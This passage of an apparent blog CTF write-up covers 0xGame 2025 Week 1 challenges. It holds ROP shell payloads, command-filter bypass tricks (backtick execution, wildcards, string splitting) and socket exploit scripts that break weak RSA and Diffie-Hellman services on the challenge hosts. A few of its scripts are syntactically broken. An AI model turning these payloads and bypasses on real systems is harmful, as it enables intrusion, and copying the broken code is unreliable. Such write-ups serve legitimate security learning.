string.digits\n    \n    # 遍历所有长度为 4 的组合\n    for i, prefix_tuple in enumerate(product(charset, repeat=4)):\n        prefix = \"\".join(prefix_tuple)\n        test_string = prefix + suffix\n        calculated_hash = hashlib.sha256(test_string.encode()).hexdigest()\n        \n        if calculated_hash == target_hash:\n            end_time = time.time()\n            duration = end_time - start_time\n            print(f\"[+] PoW 解决！ 前缀: {prefix} (耗时: {duration:.2f}s)\")\n            return prefix\n            \n    print(\"[-] PoW 破解失败！\")\n    return None\n\n# --- 主逻辑 ---\ndef main():\n    try:\n        # 1. 建立连接\n        with socket.socket(socket.AF_INET, socket.SOCK_STREAM) as s:\n            s.connect((HOST, PORT))\n            print(f\"[+] 已连接到 {HOST}:{PORT}\")\n            \n            # 2. 接收并解决 PoW\n            initial_data = s.recv(1024).decode()\n            print(initial_data)\n            \n            # 使用正则表达式解析 PoW 挑战\n            pow_match = re.search(r'sha256\\(XXXX\\+(.*?)\\) == ([\\da-f]{64})', initial_data)\n            if not pow_match:\n                print(\"[-] 无法解析 PoW 挑战。\")\n                return\n            \n            suffix, target = pow_match.groups()\n            solution = solve_pow(suffix, target)\n            \n            if not solution:\n                return\n\n            # 发送解决方案\n            s.sendall((solution + '\\n').encode())\n            \n            # 3. 接收 RSA 参数并解密\n            # 增大缓冲区以确保接收所有数据\n            response_data = s.recv(4096).decode()\n            print(response_data)\n            \n            # 使用正则表达式解析 n, e, c\n            n_match = re.search(r'n = (\\d+)', response_data)\n            e_match = re.search(r'e = (\\d+)', response_data)\n            c_match = re.search(r'c = ([\\da-f]+)', response_data)\n            \n            if not (n_match and e_match and c_match):\n                print(\"[-] 无法解析 RSA 参数。\")\n                return\n\n            n = int(n_match.group(1))\n            e = int(e_match.group(1))\n            c_hex = c_match.group(1)\n            \n            print(\"\\n[*] 开始 RSA 解密...\")\n            print(f\"    - n = {str(n)[:30]}...\")\n            print(f\"    - e = {e}\")\n            print(f\"    - c = {c_hex[:30]}...\")\n\n            # 漏洞利用: n 是素数, 所以 phi(n) = n - 1\n            phi = n - 1\n            print(\"[+] 漏洞利用：n 是素数，phi(n) = n - 1\")\n            \n            # 计算私钥 d\n            d = pow(e, -1, phi)\n            print(\"[+] 私钥 d 计算成功\")\n            \n            # 将小端序的十六进制 c 转换为整数\n            c_bytes = bytes.fromhex(c_hex)\n            c_int = int.from_bytes(c_bytes, 'little')\n            \n            # 解密消息 m\n            m_int = pow(c_int, d, n)\n            print(\"[+] 密文解密成功\")\n            \n            # 转换回文本\n            recovered_bytes = long_to_bytes(m_int)\n            # 使用 'ignore' 忽略填充的随机字节可能导致的解码错误\n            flag = recovered_bytes.decode('utf-8', errors='ignore')\n            \n            print(\"\\n\" + \"=\"*40)\n            # 提取 flag 格式的部分\n            flag_match = re.search(r'(flag\\{.*?\\})', flag)\n            if flag_match:\n                print(f\"✅ 成功找到 Flag: {flag_match.group(1)}\")\n            else:\n                print(f\"✅ 解密完成，原始文本: {flag.strip()}\")\n            print(\"=\"*40)\n\n    except Exception as e:\n        print(f\"\\n[!] 发生错误: {e}\")\n\nif __name__ == '__main__':\n    main()\n```\n\n纯AI，第一段是接收POW的哈希挑战并暴力解密，得到`n,e,c`参数放入第二段`python`脚本里计算私钥，从而实现解密,得到flag。\n\n## RSA\n\n```python\nfrom Crypto.Util.number import *\nimport gmpy2\n\n# 给定的值\nn = 5288062996177288067805240670327919739339874127477405321607402348589147491552053048231920112750216696782518281218048178087877077018108705271341382858124037\nc = 2454797328903978848197140611862882439826920912955785083080835692389929572917351093371626343669582289242212514789420568997224614087740388703381025018563979\ne = 65537\n\n# 尝试分解n（512位的n可以被在线工具分解，或使用yafu等工具）\n# 这里我们使用factordb或者其他分解方法\n\n# 方法1: 使用在线factordb API\ntry:\n    import requests\n    url = f\"http://factordb.com/api?query={n}\"\n    response = requests.get(url)\n    data = response.json()\n    if data['status'] == 'FF':  # 完全分解\n        factors = data['factors']\n        if len(factors) == 2:\n            p = int(factors[0][0])\n            q = int(factors[1][0])\n            print(f\"成功分解n:\")\n            print(f\"p = {p}\")\n            print(f\"q = {q}\")\nexcept Exception as ex:\n    print(f\"在线分解失败: {ex}\")\n    print(\"尝试本地分解...\")\n    \n    # 方法2: 使用gmpy2进行小因子试除和Pollard's rho\n    # 对于512位的n，可能需要更强大的工具如yafu\n    \n    # 先尝试小素数试除\n    def trial_division(n, limit=10000000):\n        i = 2\n        while i * i <= n and i < limit:\n            if n % i == 0:\n                return i\n            i += 1\n        return None\n    \n    factor = trial_division(n)\n    if factor:\n        p = factor\n        q = n // p\n        print(f\"找到因子: p = {p}, q = {q}\")\n    else:\n        # 使用Fermat分解法（当p和q接近时效果好）\n        def fermat_factor(n):\n            a = gmpy2.isqrt(n)\n            b2 = gmpy2.square(a) - n\n            while not gmpy2.is_square(b2):\n                a += 1\n                b2 = gmpy2.square(a) - n\n            p = a + gmpy2.isqrt(b2)\n            q = a - gmpy2.isqrt(b2)\n            return int(p), int(q)\n        \n        try:\n            p, q = fermat_factor(n)\n            print(f\"Fermat分解成功: p = {p}, q = {q}\")\n        except:\n            print(\"分解失败，需要使用更强大的分解工具（如yafu, msieve等）\")\n            print(\"或者在 factordb.com 网站上查询\")\n            exit()\n\n# 验证分解是否正确\nif p * q == n:\n    print(f\"\\n验证成功: p * q = n\")\n    \n    # 计算欧拉函数\n    phi = (p - 1) * (q - 1)\n    \n    # 计算私钥d\n    d = inverse(e, phi)\n    \n    # 解密\n    m = pow(c, d, n)\n    \n    # 转换为字节\n    flag = long_to_bytes(m)\n    \n    print(f\"\\n解密结果:\")\n    print(f\"Flag: {flag.decode()}\")\nelse:\n    print(\"分解错误: p * q != n\")\n```\n\n## Diffie-Hellman\n\n小子群攻击脚本\n\n```python\nimport socket\nfrom hashlib import sha256\n\n# 尝试导入 pwntools (可选)\ntry:\n    from pwn import remote\n    PWNTOOLS_AVAILABLE = True\nexcept ImportError:\n    PWNTOOLS_AVAILABLE = False\n\n# 尝试导入 Crypto 模块（支持多种安装方式）\ntry:\n    from Crypto.Util.number import long_to_bytes\n    from Crypto.Cipher import AES\n    from Crypto.Util.Padding import unpad\n    print(\"[+] 使用 pycryptodome\")\nexcept ImportError:\n    try:\n        from Cryptodome.Util.number import long_to_bytes\n        from Cryptodome.Cipher import AES\n        from Cryptodome.Util.Padding import unpad\n        print(\"[+] 使用 pycryptodomex\")\n    except ImportError:\n        print(\"[-] 错误：未找到加密库\")\n        print(\"请运行: pip uninstall crypto pycrypto pycryptodome -y\")\n        print(\"然后运行: pip install pycryptodome\")\n        exit(1)\n\ndef recv_until(sock, marker):\n    \"\"\"接收数据直到遇到特定标记\"\"\"\n    data = b\"\"\n    sock.settimeout(10)  # 设置超时\n    try:\n        while marker not in data:\n            chunk = sock.recv(1)\n            if not chunk:\n                break\n            data += chunk\n    except socket.timeout:\n        pass\n    return data\n\ndef recv_line(sock):\n    \"\"\"接收一行数据\"\"\"\n    data = b\"\"\n    sock.settimeout(10)\n    try:\n        while b\"\\n\" not in data:\n            chunk = sock.recv(1)\n            if not chunk:\n                break\n            data += chunk\n    except socket.timeout:\n        pass\n    return data.strip()\n\ndef exploit_manual():\n    \"\"\"\n    手动版本 - 只需要 socket 和 pycryptodome\n    \"\"\"\n    host = \"nc1.ctfplus.cn\"\n    port = 34869\n    \n    print(\"[*] 连接到服务器: {}:{}\".format(host, port))\n    \n    # 创建 socket 连接\n    sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)\n    sock.settimeout(15)  # 设置总超时\n    sock.connect((host, port))\n    \n    try:\n        # 接收并解析 Prime\n        print(\"[*] 接收 Prime...\")\n        recv_until(sock, b\"The Prime is \")\n        p_line = recv_line(sock)\n        p = int(p_line)\n        print(f\"[+] Prime (p): {p}\")\n        \n        # 接收并解析 Generator\n        print(\"[*] 接收 Generator...\")\n        recv_until(sock, b\"The Generator is \")\n        g_line = recv_line(sock)\n        g = int(g_line)\n        print(f\"[+] Generator (g): {g}\")\n        \n        # 接收并解析 Alice's Public Key\n        print(\"[*] 接收 Alice's Public Key...\")\n        recv_until(sock, b\"Alice's Public Key is \")\n        a_line = recv_line(sock)\n        A = int(a_line)\n        print(f\"[+] Alice's Public Key (A): {A}\")\n        \n        # 发送恶意的 Bob's Public Key = 1\n        print(\"[*] 等待输入提示...\")\n        recv_until(sock, b\"Bob's Public Key:\")\n        print(\"[*] 发送恶意 Bob's Public Key: 1\")\n        sock.send(b\"1\\n\")\n        \n        # 接收加密的 Flag\n        print(\"[*] 接收加密的 Flag...\")\n        recv_until(sock, b\"Encrypted Flag:\")\n        enc_line = recv_line(sock)\n        enc_hex = enc_line.decode().strip()\n        print(f\"[+] 加密的 Flag: {enc_hex}\")\n        \n        # 使用已知的共享密钥 s = 1 解密\n        print(\"[*] 正在解密...\")\n        s = 1\n        key = sha256(long_to_bytes(s)).digest()\n        cipher = AES.new(key, AES.MODE_ECB)\n        enc = bytes.fromhex(enc_hex)\n        flag = unpad(cipher.decrypt(enc), 16)\n        \n        flag_str = flag.decode()\n        print(\"\\n\" + \"=\" * 60)\n        print(f\"[+] 成功获取 Flag: {flag_str}\")\n        print(\"=\" * 60)\n        \n        return flag_str\n        \n    except Exception as e:\n        print(f\"[-] 错误: {e}\")\n        import traceback\n        traceback.print_exc()\n        return None\n    finally:\n        sock.close()\n\n\ndef exploit_with_pwntools():\n    \"\"\"\n    pwntools 版本 - 需要安装 pwntools\n    \"\"\"\n    if not PWNTOOLS_AVAILABLE:\n        return None\n    \n    host = \"nc1.ctfplus.cn\"\n    port = 34869\n    \n    print(\"[*] 连接到服务器: {}:{}\".format(host, port))\n    conn = remote(host, port)\n    \n    try:\n        # 接收并解析 Prime\n        conn.recvuntil(b\"The Prime is \")\n        p = int(conn.recvline().strip())\n        print(f\"[+] Prime (p): {p}\")\n        \n        # 接收并解析 Generator\n        conn.recvuntil(b\"The Generator is \")\n        g = int(conn.recvline().strip())\n        print(f\"[+] Generator (g): {g}\")\n        \n        # 接收并解析 Alice's Public Key\n        conn.recvuntil(b\"Alice's Public Key is \")\n        A = int(conn.recvline().strip())\n        print(f\"[+] Alice's Public Key (A): {A}\")\n        \n        # 发送恶意的 Bob's Public Key = 1\n        conn.recvuntil(b\"Bob's Public Key: \")\n        print(\"[*] 发送恶意 Bob's Public Key: 1\")\n        conn.sendline(b\"1\")\n        \n        # 接收加密的 Flag\n        conn.recvuntil(b\"Encrypted Flag: \")\n        enc_hex = conn.recvline().strip().decode()\n        print(f\"[+] 加密的 Flag: {enc_hex}\")\n        \n        # 使用已知的共享密钥 s = 1 解密\n        print(\"[*] 正在解密...\")\n        s = 1\n        key = sha256(long_to_bytes(s)).digest()\n        cipher = AES.new(key, AES.MODE_ECB)\n        enc = bytes.fromhex(enc_hex)\n        flag = unpad(cipher.decrypt(enc), 16)\n        \n        flag_str = flag.decode()\n        print(\"\\n\" + \"=\" * 60)\n        print(f\"[+] 成功获取 Flag: {flag_str}\")\n        print(\"=\" * 60)\n        \n        return flag_str\n        \n    except Exception as e:\n        print(f\"[-] 错误: {e}\")\n        import traceback\n        traceback.print_exc()\n        return None\n    finally:\n        conn.close()\n\n\nif __name__ == \"__main__\":\n    print(\"=\" * 60)\n    print(\"Diffie-Hellman 小子群攻击\")\n    print(\"Target: nc1.ctfplus.cn:34869\")\n    print(\"=\" * 60)\n    print()\n    \n    # 先尝试 pwntools 版本，如果失败则用手动版本\n    if PWNTOOLS_AVAILABLE:\n        print(\"[*] 尝试使用 pwntools...\")\n        flag = exploit_with_pwntools()\n    else:\n        print(\"[*] pwntools 未安装，使用手动版本...\")\n        flag = None\n    \n    if flag is None:\n        print(\"\\n[*] 使用手动版本（只需要 socket + pycryptodome）...\")\n        flag = exploit_manual()\n    \n    if flag:\n        print(\"\\n[*] 攻击原理:\")\n        print(\"    1. 服务器计算共享密钥: s = B^a mod p\")\n        print(\"    2. 我们发送 B = 1\")\n        print(\"    3. 则 s = 1^a mod p = 1 (已知值)\")\n        print(\"    4. 使用 s = 1 作为密钥解密 flag\")\n    else:\n        print(\"\\n[-] 攻击失败，请检查网络连接或服务器状态\")\n```\n\nflag :`0xgame{ECC_1s_4w3s0m3_but_n0t_perf3ct}`\n\n","source":"_posts/0xGame2025Week1WP.md","raw":"---\ntitle: 0xGame Week1 WP\ndate: 2025-10-10\ncategories: pwn\ntop_img: /images/background/东方/08.jpg\ncover: /images/background/东方/07.jpg\n---\n\n# Pwn\n\n## 数学题😭\n\n```python\nfrom pwn import *\ncontext.log_level='debug'\nio=remote(\"nc1.ctfplus.cn\",23143)\nio.recvuntil(b\"Kore wa shiren da!(n\")\n for i in range(1000):\n\t t=io.recvuntil(b\"?\")[:-3]\n\t if b\"x\" in t:\n\t\tt=t.decode()\n\t\tt =t.replace(\"x\",'*'\n\t\tt=t.encode()\n\t num=eval(t)\n\t io.sendline(str(num).encode())\n\t io.recvline()\n\t io.recvline()\nio.interactive()\n```\n\n## nc\n\n`nc 域名/IP 端口号`\n\n## 命令执行\n\n`ca\\t flag `这样就可以啦。\n\n## 栈溢出\n\n`buf`到`rbp`的偏移+8就是填充的垃圾数据的长度，后面再加上目标函数的返回地址就行了。\n\n## ROP1\n\n找到`rdi`，一参寄存器的地址\n\n```python\nROPgadget --binary pwn --only \"pop|ret\" | grep \"rdi\"\n```\n\n找到想要rdi存放的参数`sh`\n\n```python\nROPgadget --binary pwn --string \"sh\"\n```\n\n然后就同上一题栈溢出，构造ROP链。\n\n```python\npayload=0x28*b'a'+p64(0x000000000040117e)+p64(0x000000000040201e)+p64(0x401195)\n```\n\n就能得到flag了。\n\n完整代码：\n\n```python\nfrom pwn import *\nio=process('./pwn')\ngdb.attach(io)      // gdb调试\npayload=0x28*b'a'+p64(0x000000000040117e)+p64(0x000000000040201e)+p64(0x401195)\nio.send(payload)\nio.interactive()\n```\n\n## ROP2\n\n除了`sh`,`cat`,还有`$0`也可以获得shell，\n\n```pyhton\ngdb ./pwn\n```\n\n可以在gdb中找到`$0`字符串\n\n```python\nsearch \"$0\"\n```\n\n找到`$0`的地址后就对应替换`rdi`参数的地址。ROP链同上题。\n\n# Osint\n\n图一谷歌识图，注意山名是中文，大室山\n\n图二拍摄时的经纬度其实在照片的详细信息里已经记录了，右键属性详细信息，往下滑就能找到GPS，里面就记录了经纬度，然后进行换算，不进位，就得到了`32.1191`经度和`118.9265` 纬度。\n\n# Web\n\n## Lemon\n\n`web`是真不会，我只会开发者工具查看源码,然后就只会解签到。真的看不懂`php`😭。（骗你的，就算懂了也不会改写`http`请求。）\n\n## Http请求\n\nurl后面加`/?hello=web`这就是get传递。\n\n然后用burp抓包，对应修改请求参数，就能得到flag了。\n\n`0XGame{Congratuation_You_Are_Http_God!!!}`\n\n## rce1\n\n![hackbar](/images/wp/hackbar.png)\n\n右键检查>>找到hackbar，按上面的设置参数，注意`rce1[]=1`这样才表示rce1是数组.数组的md5相等。一些指令参数被过滤的话可以试试其他的，如`readfile`,`print`等，然后可以用引号把一些指令隔开，分开来写就不会被过滤了。如`'fl'.'a''g'`,引号之间用.拼接。对于要执行的命令需要用反引号，如``print(`tac f???`)``,反引号表示运行里面的命令。\n\n# Misc\n\n## 签到\n\n扫码关注喵~\n\n## Sign-In\n\n`==`结尾判断是base64加密，通过在线工具解密之后发现并不是`0xGame{}`,原来是还经过了字符移位，通过已知flag格式计算出偏移量，得到flag。\n\n## 公众号\n\n`.docx`文件其实就是一个`.zip`压缩包，所以更改一下后缀名，然后将`.zip`文件解压，接下来就可以去一个个文件(如`.xml`文件)里找`flag`了。\n\n## shell\n\n按照yolo师傅给的提示操作就行\n\n## shell_plus\n\n进入`welcome`用户后先`cat hash_value`找到哈希值，然后在`fikes`文件夹里用`find . -maxdepth 1 -type f -exec sha256sum {} \\; | grep \"c59aec252d136cd2da2c5af7b17aed68f661a0114e8fc38b6e2a3d4e993e38fa\"`这一行命令就可以找到那个加密的flag文件，最后用揭秘脚本解密。\n\n## LSB隐写\n\nStegSolve工具打开图片，R,G,B通道设为最低位0，就能看到flag了`0xGame{W1_Need_t0_t@k3_a_break}`。\n\n## 磁盘镜像\n\n在`bash`里用`TestDisk`分析磁盘\n\n```bash\ntestdisk do_not_enter.dd\n```\n\n在分区表中发现了一个名为 **`[Do_not_enter]`** 的分区.\n\n挂载分区,\n\n```bash\nsudo mount -o loop,offset=44040192 do_not_enter.dd /mnt/secret\n```\n\n查看分区内容,\n\n```bash\nls -la /mnt/secret\n\n# 如果有文件夹，深入查看\nfind /mnt/secret -type f -name \"*flag*\" 2>/dev/null\nfind /mnt/secret -type f 2>/dev/null\n```\n\n但不幸的是分区之中没有,不如直接用`strings`把全部字符串找出来吧，`strings`命令好用！\n\n```bash\nsudo strings /mnt/secret/syslog\nsudo strings /mnt/secret/auth.log\n```\n\n然后就找到了flag:`0xGame{WoW_y0u_fouNd_1t?_114514}`\n\n# Reverse\n\n## SignIn\n\n`shift`+F12  就可以看到所有字符串啦，包括flag🥰。\n\n## SignIn2\n\nROT加密：凯撒密码，移位操作进行字符加密。  0移位16得到@。从而得到`0xGame{}`形式的flag。\n\n## ZZZ\n\n```python\n# 导入z3库\nfrom z3 import *\n\nx1 = BitVec('x1', 32)\nx2 = BitVec('x2', 32)\nx3 = BitVec('x3', 32)\nx4 = BitVec('x4', 32)\nsolver = Solver()\nsolver.add(3 * x2 + 5 * x1 + 7 * x4 + 2 * x3 == -1445932505)\nsolver.add(8 * x2 + 4 * x3 + 2 * x1 + x4 == -672666814)\nsolver.add(7 * x2 + 3 * x1 + 5 * x4 + 4 * x3 == 958464147)\nsolver.add(((x1 ^ x2) << 6) + (LShR(x3, 6) ^ 0x4514) == 123074281)\n# 循环寻找所有可能的\nwhile solver.check() == sat:\n    model = solver.model()\n    v1 = model[x1].as_long()\n    v2 = model[x2].as_long()\n    v3 = model[x3].as_long()\n    v4 = model[x4].as_long()\n\n    print(f\"x1 = {hex(v1)} ({v1})\")\n    print(f\"x2 = {hex(v2)} ({v2})\")\n    print(f\"x3 = {hex(v3)} ({v3})\")\n    print(f\"x4 = {hex(v4)} ({v4})\")\n    final_flag = f\"0xGame{{{v1:08x}{v2:08x}{v3:08x}{v4:08x}}}\"\n    print(f\"Flag: {final_flag}\")\n    solver.add(Or(x1 != v1, x2 != v2, x3 != v3, x4 != v4))\n```\n\n此题有多解，注意正确flag的哈希值。\n\n# Crypto\n\n## 维吉尼亚加密\n\n全AI,维吉尼亚加密advanced我解出了多种可能，试了一下`0xGame{excellent}`这个是对的，就解出来了。\n\n```python\nfrom string import digits, ascii_letters, punctuation, ascii_lowercase\nfrom itertools import product\n\nkey = \"QAQ(@.@)\"\nalphabet = digits + ascii_letters + punctuation\nciphertext = \"0l0CSoYM<c;amo_P_\"\n\nprint(f\"密文: {ciphertext}\")\nprint(f\"Key: {key}\")\nprint(f\"Alphabet长度: {len(alphabet)}\")\nprint(\"=\"*70)\n\n# 验证加密函数\ndef vigenere_encrypt(plaintext, key):\n    ciphertext = \"\"\n    key_index = 0\n    for i in plaintext:\n        bias = alphabet.index(key[key_index])\n        char_index = alphabet.index(i)\n        new_index = ((char_index + bias) * char_index) % len(alphabet)\n        ciphertext += alphabet[new_index]\n        key_index = (key_index + 1) % len(key)\n    return ciphertext\n\n# 找出每个位置的所有可能解\ndef find_all_solutions_per_position(ciphertext, key):\n    all_solutions = []\n    \n    for pos, cipher_char in enumerate(ciphertext):\n        key_index = pos % len(key)\n        bias = alphabet.index(key[key_index])\n        cipher_index = alphabet.index(cipher_char)\n        \n        solutions = []\n        for char_index in range(len(alphabet)):\n            if ((char_index + bias) * char_index) % len(alphabet) == cipher_index:\n                solutions.append(alphabet[char_index])\n        \n        all_solutions.append(solutions)\n    \n    return all_solutions\n\nall_solutions = find_all_solutions_per_position(ciphertext, key)\n\n# 显示每个位置的可能解\nprint(\"\\n每个位置的所有可能解:\")\nfor i, (cipher_char, solutions) in enumerate(zip(ciphertext, all_solutions)):\n    key_char = key[i % len(key)]\n    print(f\"位置{i:2d} | 密文:'{cipher_char}' key:'{key_char}' | 解:{solutions} (共{len(solutions)}个)\")\n\nprint(\"\\n\" + \"=\"*70)\n\n# 尝试搜索所有符合条件的flag\nprint(\"搜索符合 0xGame{小写字母} 格式的所有可能flag:\\n\")\n\ntarget_prefix = \"0xGame{\"\ntarget_suffix = \"}\"\n\n# 检查前缀和后缀是否可行\nprefix_valid = all(target_prefix[i] in all_solutions[i] for i in range(len(target_prefix)))\nsuffix_valid = target_suffix in all_solutions[-1]\n\nif not prefix_valid:\n    print(\"❌ 无法构造 '0xGame{' 前缀\")\n    for i in range(len(target_prefix)):\n        if target_prefix[i] not in all_solutions[i]:\n            print(f\"   位置{i}: 需要'{target_prefix[i]}', 但只有 {all_solutions[i]}\")\nelif not suffix_valid:\n    print(f\"❌ 无法构造 '}}' 后缀，位置{len(ciphertext)-1}只有: {all_solutions[-1]}\")\nelse:\n    print(\"✓ 前缀和后缀都可行\\n\")\n    \n    # 中间部分的索引\n    middle_start = len(target_prefix)\n    middle_end = len(ciphertext) - 1\n    \n    # 获取中间每个位置的小写字母选项\n    middle_options = []\n    for i in range(middle_start, middle_end):\n        lowercase_opts = [c for c in all_solutions[i] if c in ascii_lowercase]\n        middle_options.append(lowercase_opts)\n        print(f\"位置{i} 的小写字母选项: {lowercase_opts}\")\n    \n    # 检查是否所有中间位置都有小写字母选项\n    if all(len(opts) > 0 for opts in middle_options):\n        print(f\"\\n所有中间位置都有小写字母选项\")\n        print(f\"总共有 {sum(len(opts) for opts in middle_options)} 个可能的组合\")\n        \n        # 如果组合数不太多，枚举所有可能\n        total_combinations = 1\n        for opts in middle_options:\n            total_combinations *= len(opts)\n        \n        print(f\"可能的flag数量: {total_combinations}\")\n        \n        if total_combinations <= 1000:\n            print(\"\\n枚举所有可能的flag:\\n\")\n            valid_flags = []\n            \n            for combo in product(*middle_options):\n                middle = \"\".join(combo)\n                flag = target_prefix + middle + target_suffix\n                \n                # 验证\n                encrypted = vigenere_encrypt(flag, key)\n                if encrypted == ciphertext:\n                    valid_flags.append(flag)\n                    print(f\"✓ 找到有效flag: {flag}\")\n            \n            if not valid_flags:\n                print(\"❌ 没有找到完全匹配的flag\")\n            else:\n                print(f\"\\n找到 {len(valid_flags)} 个有效flag\")\n        else:\n            print(f\"\\n组合数太多({total_combinations})，显示第一个可能的flag:\")\n            middle = \"\".join(opts[0] for opts in middle_options)\n            flag = target_prefix + middle + target_suffix\n            encrypted = vigenere_encrypt(flag, key)\n            print(f\"Flag: {flag}\")\n            print(f\"验证: {encrypted == ciphertext}\")\n    else:\n        print(\"\\n❌ 某些中间位置没有小写字母选项\")\n```\n\n## 笙莲\n\n题目将一个 100 字节的 flag（原始 flag 内容 + 随机填充）分成了四个 25 字节的部分，并对每个部分使用了不同的加密方法。我们的任务是分别逆向这些加密过程，然后将四部分拼接回来，最后得到原始的 flag。\n\n给定的密文：\n\n```python\nc0_b64 = b'MHhHYW1le7u2063AtLW9MHhHYW1lMjAyNQ=='\nc1_hex = 'a3accfd6d4dac4e3d2d1beadd1a7bbe143727970746fb5c4bb'\nc2_awaqaq = 'wqwwwqqaawwwaaqawqwawwwwaaawwwawaqqwwwqaqwwqwaaqwaqqaaawqqqaqaqwaaawwwqaqaaaaqawaqqqwwqqwaqwqwwwawawqqwwqqawqwaqwwawwqwaqqaqwaw'\nc3_int = 5787980659359196741038715872684190805073807486263453249083702093905274294594502252203577660251756609738877887210677202141957646934092054500618364441642896304387589669635034683021946777034215355675802286923927161922717560413551789421376288823912349463080999424773600185557948875343480056576969695671340947861706467351885610345887785319870159654836532664189086047061137903149197973327299859185905186913896041309284477616128\n```\n\nPart1. Base64解密\n\n```python\nimport base64\n\nflag0 = base64.b64decode(c0_b64)\n```\n\nPart2.十六进制转字节\n\n```python\nflag1 = bytes.fromhex(c1_hex)\n```\n\nPart3. 替换加密, 'a' 代表 0，'w' 代表 1，'q' 代表 2\n\n```python\ndef reverse_awaqaq(s: str) -> bytes:\n    mapper = {'a': 0, 'w': 1, 'q': 2}\n    num = 0\n    power = 1\n    for char in s:\n        num += mapper[char] * power\n        power *= 3\n    # 原始脚本中 int.from_bytes 默认使用大端序 (big-endian)\n    # 长度为 25 字节\n    return num.to_bytes(25, 'big')\n\nflag2 = reverse_awaqaq(c2_awaqaq)\n```\n\nPart4. 7次方并用小端序表示的数，开7次方根\n\n```python\ndef integer_nth_root(n, r):\n    \"\"\"计算 n 的 r 次整数根\"\"\"\n    if n < 0:\n        return None\n    if n == 0:\n        return 0\n    low, high = 1, n\n    root = None\n    while low <= high:\n        mid = (low + high) // 2\n        if mid == 0:  # 避免 mid 为 0\n            low = 1\n            continue\n        try:\n            val = mid**r\n        except OverflowError:\n            val = float('inf')\n        \n        if val == n:\n            return mid\n        elif val < n:\n            low = mid + 1\n            root = mid\n        else:\n            high = mid - 1\n    return root\n\nroot = integer_nth_root(c3_int, 7)\n# 题目指明了使用小端序 (little-endian)\nflag3 = root.to_bytes(25, 'little')\n```\n\n最后拼接4个部分的flag，然后使用`gb2312`编码解码得到flag。\n\n## 2FA\n\n这道题的收获就是安装了一个好用的身份验证APP，`microsoft authenticator`，扫码验证登录了就行了。\n\n## 芸翎\n\n```python\nimport socket\nimport re\nimport hashlib\nimport string\nfrom itertools import product\nfrom Crypto.Util.number import long_to_bytes\nimport time\n\n# --- 配置 ---\nHOST = 'nc1.ctfplus.cn'\nPORT = 12494\n\n# --- PoW 解决函数 ---\ndef solve_pow(suffix: str, target_hash: str) -> str:\n    \"\"\"\n    通过暴力破解来解决 SHA-256 工作量证明挑战。\n    \"\"\"\n    print(f\"[*] 目标: sha256(XXXX + {suffix}) == {target_hash}\")\n    print(\"[*] 开始暴力破解 PoW...\")\n    start_time = time.time()\n    \n    # 字符集：大小写字母 + 数字\n    charset = string.ascii_letters + string.digits\n    \n    # 遍历所有长度为 4 的组合\n    for i, prefix_tuple in enumerate(product(charset, repeat=4)):\n        prefix = \"\".join(prefix_tuple)\n        test_string = prefix + suffix\n        calculated_hash = hashlib.sha256(test_string.encode()).hexdigest()\n        \n        if calculated_hash == target_hash:\n            end_time = time.time()\n            duration = end_time - start_time\n            print(f\"[+] PoW 解决！ 前缀: {prefix} (耗时: {duration:.2f}s)\")\n            return prefix\n            \n    print(\"[-] PoW 破解失败！\")\n    return None\n\n# --- 主逻辑 ---\ndef main():\n    try:\n        # 1. 建立连接\n        with socket.socket(socket.AF_INET, socket.SOCK_STREAM) as s:\n            s.connect((HOST, PORT))\n            print(f\"[+] 已连接到 {HOST}:{PORT}\")\n            \n            # 2. 接收并解决 PoW\n            initial_data = s.recv(1024).decode()\n            print(initial_data)\n            \n            # 使用正则表达式解析 PoW 挑战\n            pow_match = re.search(r'sha256\\(XXXX\\+(.*?)\\) == ([\\da-f]{64})', initial_data)\n            if not pow_match:\n                print(\"[-] 无法解析 PoW 挑战。\")\n                return\n            \n            suffix, target = pow_match.groups()\n            solution = solve_pow(suffix, target)\n            \n            if not solution:\n                return\n\n            # 发送解决方案\n            s.sendall((solution + '\\n').encode())\n            \n            # 3. 接收 RSA 参数并解密\n            # 增大缓冲区以确保接收所有数据\n            response_data = s.recv(4096).decode()\n            print(response_data)\n            \n            # 使用正则表达式解析 n, e, c\n            n_match = re.search(r'n = (\\d+)', response_data)\n            e_match = re.search(r'e = (\\d+)', response_data)\n            c_match = re.search(r'c = ([\\da-f]+)', response_data)\n            \n            if not (n_match and e_match and c_match):\n                print(\"[-] 无法解析 RSA 参数。\")\n                return\n\n            n = int(n_match.group(1))\n            e = int(e_match.group(1))\n            c_hex = c_match.group(1)\n            \n            print(\"\\n[*] 开始 RSA 解密...\")\n            print(f\"    - n = {str(n)[:30]}...\")\n            print(f\"    - e = {e}\")\n            print(f\"    - c = {c_hex[:30]}...\")\n\n            # 漏洞利用: n 是素数, 所以 phi(n) = n - 1\n            phi = n - 1\n            print(\"[+] 漏洞利用：n 是素数，phi(n) = n - 1\")\n            \n            # 计算私钥 d\n            d = pow(e, -1, phi)\n            print(\"[+] 私钥 d 计算成功\")\n            \n            # 将小端序的十六进制 c 转换为整数\n            c_bytes = bytes.fromhex(c_hex)\n            c_int = int.from_bytes(c_bytes, 'little')\n            \n            # 解密消息 m\n            m_int = pow(c_int, d, n)\n            print(\"[+] 密文解密成功\")\n            \n            # 转换回文本\n            recovered_bytes = long_to_bytes(m_int)\n            # 使用 'ignore' 忽略填充的随机字节可能导致的解码错误\n            flag = recovered_bytes.decode('utf-8', errors='ignore')\n            \n            print(\"\\n\" + \"=\"*40)\n            # 提取 flag 格式的部分\n            flag_match = re.search(r'(flag\\{.*?\\})', flag)\n            if flag_match:\n                print(f\"✅ 成功找到 Flag: {flag_match.group(1)}\")\n            else:\n                print(f\"✅ 解密完成，原始文本: {flag.strip()}\")\n            print(\"=\"*40)\n\n    except Exception as e:\n        print(f\"\\n[!] 发生错误: {e}\")\n\nif __name__ == '__main__':\n    main()\n```\n\n纯AI，第一段是接收POW的哈希挑战并暴力解密，得到`n,e,c`参数放入第二段`python`脚本里计算私钥，从而实现解密,得到flag。\n\n## RSA\n\n```python\nfrom Crypto.Util.number import *\nimport gmpy2\n\n# 给定的值\nn = 5288062996177288067805240670327919739339874127477405321607402348589147491552053048231920112750216696782518281218048178087877077018108705271341382858124037\nc = 2454797328903978848197140611862882439826920912955785083080835692389929572917351093371626343669582289242212514789420568997224614087740388703381025018563979\ne = 65537\n\n# 尝试分解n（512位的n可以被在线工具分解，或使用yafu等工具）\n# 这里我们使用factordb或者其他分解方法\n\n# 方法1: 使用在线factordb API\ntry:\n    import requests\n    url = f\"http://factordb.com/api?query={n}\"\n    response = requests.get(url)\n    data = response.json()\n    if data['status'] == 'FF':  